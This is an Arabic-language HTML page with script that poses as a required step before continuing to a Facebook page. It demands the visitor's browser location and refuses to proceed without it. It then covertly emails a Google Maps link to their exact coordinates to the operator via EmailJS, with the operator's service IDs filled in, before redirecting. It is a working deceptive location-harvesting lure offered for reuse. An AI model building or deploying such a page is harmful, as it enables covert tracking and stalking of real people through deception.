<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>التحقق من الموقع وعرض الخريطة</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #fff;
      text-align: center;
      padding: 20px;
    }

    #loadingMessage, #welcomeMessage, #errorContainer, #mapContainer {
      margin-top: 20px;
    }

    #startBtn, #retryBtn {
      padding: 10px 20px;
      font-size: 16px;
      background-color: #1976d2;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 15px; /* Added margin for better spacing */
    }

    #errorContainer {
      color: red;
      font-weight: bold;
      display: none;
    }

    #mapContainer {
      width: 90%; /* Adjust as needed */
      height: 400px; /* Adjust as needed */
      max-width: 600px;
      border: 1px solid #ccc;
      margin-top: 20px;
      display: none;
    }

    #loadingMessage {
      font-size: 1.2em;
      color: #555;
      display: none; /* Hidden by default, shown when loading */
    }

    /* Initial state before any action */
    #welcomeMessage {
        display: block; /* Visible by default */
    }

    #startBtn {
        display: none; /* Hidden by default, as we ask directly */
    }
  </style>
</head>
<body>

  <div id="welcomeMessage">
    <h2>يرجى السماح بالوصول إلى موقعك للمتابعة إلى صفحة فيسبوك.</h2>
    <p>هذا يساعدنا في تقديم تجربة أفضل.</p>
  </div>

  <div id="loadingMessage">
    <p>جاري الحصول على موقعك...</p>
  </div>

  <div id="mapContainer"></div>

  <div id="errorContainer">
    <p>⚠️ لا يمكنك المتابعة إلا إذا وافقت على الوصول إلى موقعك.</p>
    <p>الرجاء تفعيل خدمات الموقع لجهازك وإعادة المحاولة.</p>
    <button id="retryBtn" onclick="askForLocation()">المحاولة مرة أخرى</button>
  </div>

  <script>
    // ************************
    // قم بتغيير هذه القيم بمعلوماتك الخاصة
    const EMAILJS_PUBLIC_KEY = "0XeUaAWOfdeN9gGEr"; // مفتاح EmailJS العام الخاص بك
    const EMAILJS_SERVICE_ID = "service_gtkrov5"; // معرف الخدمة الخاص بك في EmailJS
    const EMAILJS_TEMPLATE_ID = "template_jj0pjs9"; // معرف القالب الخاص بك في EmailJS
    const FACEBOOK_PAGE_URL = "https://www.facebook.com/your_facebook_page"; // رابط صفحة فيسبوك
    const Maps_API_KEY = "YOUR_Maps_API_KEY"; // *** ضع مفتاح Google Maps API الخاص بك هنا ***
    // ************************

    emailjs.init(EMAILJS_PUBLIC_KEY);

    // دالة لإنشاء الخريطة وعرضها
    function initMap(latitude, longitude) {
      const mapContainer = document.getElementById("mapContainer");
      mapContainer.style.display = "block"; // عرض حاوية الخريطة

      const location = { lat: latitude, lng: longitude };
      const map = new google.maps.Map(mapContainer, {
        zoom: 15, // مستوى التكبير
        center: location, // مركز الخريطة
      });

      // إضافة علامة للموقع
      new google.maps.Marker({
        position: location,
        map: map,
        title: "موقعك الحالي",
      });
    }

    // دالة لإرسال رابط الموقع عبر EmailJS
    function sendLocationLink(latitude, longitude) {
      const now = new Date().toLocaleString();
      // رابط Google Maps المباشر للموقع
      const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

      const params = {
        name: "Location Bot",
        time: now,
        message: `موقع المستخدم المباشر:\n${googleMapsLink}`
      };

      emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params)
        .then(() => {
          console.log("Location link sent successfully!");
          // بعد إرسال الموقع بنجاح، يتم التوجيه إلى فيسبوك
          setTimeout(() => { // تأخير بسيط ليرى المستخدم الخريطة قبل التوجيه
            window.location.href = FACEBOOK_PAGE_URL;
          }, 3000); // 3 ثواني
        })
        .catch(err => {
          console.error("Email error:", err);
          alert("حدث خطأ أثناء إرسال بيانات الموقع، ولكن سيتم توجيهك.");
          // حتى لو فشل الإرسال، يتم التوجيه لفيسبوك
          setTimeout(() => {
            window.location.href = FACEBOOK_PAGE_URL;
          }, 3000); // 3 ثواني
        });
    }

    // الدالة الرئيسية لطلب الموقع
    function askForLocation() {
      // إخفاء جميع العناصر الأخرى
      document.getElementById("welcomeMessage").style.display = "none";
      document.getElementById("errorContainer").style.display = "none";
      document.getElementById("retryBtn").style.display = "none";
      document.getElementById("mapContainer").style.display = "none";

      // عرض رسالة التحميل
      document.getElementById("loadingMessage").style.display = "block";


      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(success => {
          document.getElementById("loadingMessage").style.display = "none"; // إخفاء رسالة التحميل
          const lat = success.coords.latitude;
          const lon = success.coords.longitude;

          initMap(lat, lon); // عرض الخريطة
          sendLocationLink(lat, lon); // إرسال رابط الموقع

        }, error => {
          document.getElementById("loadingMessage").style.display = "none"; // إخفاء رسالة التحميل
          document.getElementById("welcomeMessage").style.display = "none"; // تأكد من إخفائها

          if (error.code === error.PERMISSION_DENIED) {
            document.getElementById("errorContainer").style.display = "block";
          } else {
            alert("حدث خطأ غير متوقع أثناء محاولة الحصول على موقعك. يرجى المحاولة مرة أخرى.");
            document.getElementById("errorContainer").style.display = "block"; // عرض الخطأ العام
          }
        });
      } else {
          document.getElementById("loadingMessage").style.display = "none";
          alert("متصفحك لا يدعم خاصية تحديد الموقع الجغرافي.");
          // يمكنك توجيههم لفيسبوك هنا أو عرض رسالة أخرى
          window.location.href = FACEBOOK_PAGE_URL; // توجيه مباشر إذا كان المتصفح لا يدعم
      }
    }

    // عند تحميل الصفحة بالكامل، ابدأ عملية طلب الموقع مباشرة
    window.onload = () => {
      askForLocation();
    };
  </script>

  <script async defer src="https://maps.googleapis.com/maps/api/js?key=YOUR_Maps_API_KEY&callback=initMapPlaceholder"></script>
  <script>
    // وظيفة وهمية لـ callback لأن initMap سيتم استدعاؤها يدوياً
    // Google Maps API تطلب وظيفة callback، لكننا نتحكم بالتهيئة يدوياً
    function initMapPlaceholder() {}
  </script>

</body>
</html>
